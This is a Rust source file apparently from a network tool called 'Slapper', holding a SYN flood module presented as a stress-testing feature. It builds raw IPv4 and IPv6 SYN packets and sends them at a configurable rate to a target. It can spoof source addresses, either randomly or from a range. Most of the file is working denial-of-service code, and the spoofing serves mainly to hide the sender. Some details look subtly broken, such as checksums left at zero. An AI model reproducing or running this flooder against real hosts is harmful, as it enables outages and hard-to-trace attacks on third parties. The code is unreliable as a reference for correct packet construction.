#[cfg(all(feature = "stress-testing", unix))]
use crate::error::{Result, SlapperError};
#[cfg(all(feature = "stress-testing", unix))]
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
#[cfg(all(feature = "stress-testing", unix))]
use std::time::{Duration, Instant};

#[cfg(all(feature = "stress-testing", unix))]
use pnet::datalink::{self, Channel::Ethernet, Config, NetworkInterface};
#[cfg(all(feature = "stress-testing", unix))]
use pnet::packet::ip::IpNextHeaderProtocols;
#[cfg(all(feature = "stress-testing", unix))]
use pnet::packet::tcp::TcpFlags;

#[cfg(all(feature = "stress-testing", unix))]
use rand::Rng;

#[cfg(all(feature = "stress-testing", unix))]
use super::metrics::StressMetrics;
#[cfg(all(feature = "stress-testing", unix))]
use super::{StressConfig, StressStats};

#[cfg(all(feature = "stress-testing", unix))]
pub async fn run_syn_flood(config: &StressConfig, metrics: &StressMetrics) -> Result<StressStats> {
    let target_ip = resolve_target(&config.target).await?;
    let target_addr = SocketAddr::new(target_ip, config.port);

    let interface = get_network_interface()?;
    let (mut tx, _rx) = create_channel(&interface)?;

    metrics.start();

    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration_secs);
    let interval = Duration::from_micros(1_000_000 / config.rate_pps.max(1));

    let mut seq_num: u32 = 1000;
    let mut src_port: u16 = 40000;

    while start_time.elapsed() < duration {
        if config.random_source_port {
            src_port = rand::random::<u16>() % 20000 + 40000;
        } else {
            src_port = src_port.wrapping_add(1);
        }

        let packet = match target_addr.ip() {
            IpAddr::V4(dst_ip) => {
                let src_ip = if config.spoof_source {
                    get_spoofed_source(&config.spoof_range)?
                } else {
                    get_local_ip(&interface)?
                };
                build_syn_packet_v4(src_ip, src_port, dst_ip, target_addr.port(), seq_num)?
            }
            IpAddr::V6(dst_ip) => {
                let src_ip = if config.spoof_source {
                    get_spoofed_source_v6(&config.spoof_range)?
                } else {
                    get_local_ip_v6(&interface)?
                };
                build_syn_packet_v6(src_ip, src_port, dst_ip, target_addr.port(), seq_num)?
            }
        };

        match tx.send_to(&packet, Some(interface.clone())) {
            Some(Ok(_)) => {
                metrics.record_packet(64);
            }
            Some(Err(e)) => {
                tracing::debug!("Send error: {}", e);
                metrics.record_error();
            }
            None => {
                metrics.record_error();
            }
        }

        seq_num = seq_num.wrapping_add(1);

        if interval > Duration::ZERO {
            tokio::time::sleep(interval).await;
        }
    }

    Ok(metrics.to_stats())
}

#[cfg(all(feature = "stress-testing", unix))]
fn build_syn_packet_v4(
    src_ip: Ipv4Addr,
    src_port: u16,
    dst_ip: Ipv4Addr,
    dst_port: u16,
    seq: u32,
) -> Result<Vec<u8>> {
    use pnet_packet::ipv4::MutableIpv4Packet;
    use pnet_packet::tcp::MutableTcpPacket;

    let mut buffer = vec![0u8; 20 + 20];

    let mut ipv4_packet = MutableIpv4Packet::new(&mut buffer[..20])
        .ok_or_else(|| SlapperError::Runtime("Failed to create IPv4 packet".to_string()))?;

    ipv4_packet.set_version(4);
    ipv4_packet.set_header_length(5);
    ipv4_packet.set_total_length(40);
    ipv4_packet.set_ttl(64);
    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
    ipv4_packet.set_source(src_ip);
    ipv4_packet.set_destination(dst_ip);

    let mut tcp_packet = MutableTcpPacket::new(&mut buffer[20..])
        .ok_or_else(|| SlapperError::Runtime("Failed to create TCP packet".to_string()))?;

    tcp_packet.set_source(src_port);
    tcp_packet.set_destination(dst_port);
    tcp_packet.set_sequence(seq);
    tcp_packet.set_acknowledgement(0);
    tcp_packet.set_data_offset(5);
    tcp_packet.set_flags(TcpFlags::SYN);
    tcp_packet.set_window(65535);
    tcp_packet.set_checksum(0);

    Ok(buffer)
}

#[cfg(all(feature = "stress-testing", unix))]
fn build_syn_packet_v6(
    src_ip: Ipv6Addr,
    src_port: u16,
    dst_ip: Ipv6Addr,
    dst_port: u16,
    seq: u32,
) -> Result<Vec<u8>> {
    use pnet_packet::ipv6::MutableIpv6Packet;
    use pnet_packet::tcp::MutableTcpPacket;

    let mut buffer = vec![0u8; 40 + 20];

    let mut ipv6_packet = MutableIpv6Packet::new(&mut buffer[..40])
        .ok_or_else(|| SlapperError::Runtime("Failed to create IPv6 packet".to_string()))?;

    ipv6_packet.set_version(6);
    ipv6_packet.set_payload_length(20);
    ipv6_packet.set_hop_limit(64);
    ipv6_packet.set_next_header(IpNextHeaderProtocols::Tcp);
    ipv6_packet.set_source(src_ip);
    ipv6_packet.set_destination(dst_ip);

    let mut tcp_packet = MutableTcpPacket::new(&mut buffer[40..])
        .ok_or_else(|| SlapperError::Runtime("Failed to create TCP packet".to_string()))?;

    tcp_packet.set_source(src_port);
    tcp_packet.set_destination(dst_port);
    tcp_packet.set_sequence(seq);
    tcp_packet.set_acknowledgement(0);
    tcp_packet.set_data_offset(5);
    tcp_packet.set_flags(TcpFlags::SYN);
    tcp_packet.set_window(65535);
    tcp_packet.set_checksum(0);

    Ok(buffer)
}

#[cfg(all(feature = "stress-testing", unix))]
async fn resolve_target(target: &str) -> Result<IpAddr> {
    if let Ok(ip) = target.parse::<IpAddr>() {
        return Ok(ip);
    }

    let addrs: Vec<_> = tokio::net::lookup_host((target, 0)).await?.collect();

    addrs
        .first()
        .map(|a| a.ip())
        .ok_or_else(|| SlapperError::Runtime(format!("Failed to resolve target: {}", target)))
}

#[cfg(all(feature = "stress-testing", unix))]
fn get_network_interface() -> Result<NetworkInterface> {
    let interfaces = datalink::interfaces();

    interfaces
        .into_iter()
        .find(|iface| iface.is_up() && !iface.is_loopback() && !iface.ips.is_empty())
        .ok_or_else(|| SlapperError::Runtime("No suitable network interface found".to_string()))
}

#[cfg(all(feature = "stress-testing", unix))]
fn create_channel(
    interface: &NetworkInterface,
) -> Result<(
    Box<dyn datalink::DataLinkSender>,
    Box<dyn datalink::DataLinkReceiver>,
)> {
    crate::utils::privilege::check_privileged("SYN scan")?;
    let config = Config::default();

    match datalink::channel(interface, config) {
        Ok(Ethernet(tx, rx)) => Ok((tx, rx)),
        Ok(_) => Err(SlapperError::Runtime(
            "Unsupported channel type".to_string(),
        )),
        Err(e) => Err(SlapperError::Runtime(format!(
            "Failed to create channel: {}",
            e
        ))),
    }
}

#[cfg(all(feature = "stress-testing", unix))]
fn get_local_ip(interface: &NetworkInterface) -> Result<Ipv4Addr> {
    interface
        .ips
        .iter()
        .find_map(|ip| match ip.ip() {
            IpAddr::V4(ip) => Some(ip),
            _ => None,
        })
        .ok_or_else(|| SlapperError::Runtime("No IPv4 address found on interface".to_string()))
}

#[cfg(all(feature = "stress-testing", unix))]
fn get_local_ip_v6(interface: &NetworkInterface) -> Result<Ipv6Addr> {
    interface
        .ips
        .iter()
        .find_map(|ip| match ip.ip() {
            IpAddr::V6(ip) => Some(ip),
            _ => None,
        })
        .ok_or_else(|| SlapperError::Runtime("No IPv6 address found on interface".to_string()))
}

#[cfg(all(feature = "stress-testing", unix))]
fn get_spoofed_source(range: &Option<String>) -> Result<Ipv4Addr> {
    let mut rng = rand::thread_rng();

    if let Some(range_str) = range {
        let parts: Vec<&str> = range_str.split('/').collect();
        if parts.len() == 2 {
            let base: Ipv4Addr = parts[0].parse()?;
            let prefix: u8 = parts[1].parse()?;

            let base_u32 = u32::from(base);
            let host_bits = 32 - prefix;
            let offset = rng.gen_range(1..(1u32 << host_bits) - 1);

            return Ok(Ipv4Addr::from(base_u32 | offset));
        }

        let parts: Vec<&str> = range_str.split('-').collect();
        if parts.len() == 2 {
            let start: u32 = parts[0].parse()?;
            let end: u32 = parts[1].parse()?;
            if end > start {
                let offset = rng.gen_range(0..(end - start + 1));
                return Ok(Ipv4Addr::from(start + offset));
            }
        }
    }

    Ok(Ipv4Addr::new(
        rng.gen_range(1..254),
        rng.gen_range(0..254),
        rng.gen_range(0..254),
        rng.gen_range(1..254),
    ))
}

#[cfg(all(feature = "stress-testing", unix))]
fn get_spoofed_source_v6(range: &Option<String>) -> Result<Ipv6Addr> {
    let mut rng = rand::thread_rng();

    if let Some(range_str) = range {
        let parts: Vec<&str> = range_str.split('/').collect();
        if parts.len() == 2 {
            let base: Ipv6Addr = parts[0].parse()?;
            let prefix: u8 = parts[1].parse()?;

            let base_segments = base.segments();
            let host_bits = 128 - prefix;
            let offset_lo = rng.gen_range(1..u16::MAX);
            let offset_hi = if host_bits > 16 {
                rng.gen_range(0..(1u16 << (host_bits - 16).min(16)))
            } else {
                0
            };

            let new_lo = base_segments[7] | offset_lo;
            let new_hi = base_segments[6] | offset_hi;
            return Ok(Ipv6Addr::new(
                base_segments[0],
                base_segments[1],
                base_segments[2],
                base_segments[3],
                base_segments[4],
                base_segments[5],
                new_hi,
                new_lo,
            ));
        }

        let parts: Vec<&str> = range_str.split('-').collect();
        if parts.len() == 2 {
            let start: u128 = parts[0].parse()?;
            let end: u128 = parts[1].parse()?;
            if end > start {
                let offset = rng.gen_range(0..(end - start + 1));
                return Ok(Ipv6Addr::from(start + offset));
            }
        }
    }

    Ok(Ipv6Addr::new(
        0xfe80,
        0,
        0,
        0,
        rng.gen_range(0..0xffff),
        rng.gen_range(0..0xffff),
        rng.gen_range(0..0xffff),
        rng.gen_range(1..0xffff),
    ))
}

#[cfg(not(all(feature = "stress-testing", unix)))]
pub async fn run_syn_flood(
    _config: &super::StressConfig,
    _metrics: &super::metrics::StressMetrics,
) -> crate::error::Result<super::StressStats> {
    Err(SlapperError::Runtime(
        "SYN flood requires Unix and 'stress-testing' feature enabled".to_string(),
    ))
}
